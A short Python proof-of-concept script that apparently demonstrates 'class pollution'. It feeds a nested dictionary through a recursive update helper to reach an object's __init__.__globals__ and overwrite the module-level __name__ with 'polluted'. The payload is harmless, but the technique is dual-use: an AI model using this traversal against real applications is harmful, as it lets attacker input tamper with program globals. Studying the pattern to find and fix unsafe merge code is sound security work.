from dict import update_class_from_dict

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age

obj = Animal('cat', 11)

update_class_from_dict(obj, {
   '__init__': {
        '__globals__': {
            '__name__': 'polluted'
        }
   }
})

print(__name__)